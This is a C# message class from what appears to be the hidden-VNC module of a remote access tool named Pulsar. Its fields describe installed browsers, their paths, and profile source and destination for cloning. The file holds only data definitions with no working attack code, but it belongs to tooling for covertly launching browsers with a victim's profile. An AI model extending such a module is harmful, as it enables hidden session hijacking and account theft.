using MessagePack;

namespace Pulsar.Common.Messages.Monitoring.HVNC
{
    [MessagePackObject]
    public class HVNCBrowserDefinition
    {
        [Key(1)]
        public string BrowserId { get; set; } = string.Empty;

        [Key(2)]
        public string DisplayName { get; set; } = string.Empty;

        [Key(3)]
        public bool Installed { get; set; }

        [Key(4)]
        public string ExecutablePath { get; set; } = string.Empty;

        [Key(5)]
        public string ProfileSource { get; set; } = string.Empty;

        [Key(6)]
        public string ProfileDestination { get; set; } = string.Empty;

        [Key(7)]
        public bool SupportsProfileClone { get; set; }

        [Key(8)]
        public bool SupportsDirectLaunch { get; set; } = true;

        [Key(9)]
        public string DetectionSource { get; set; } = string.Empty;

        [Key(10)]
        public string Architecture { get; set; } = string.Empty;
    }
}
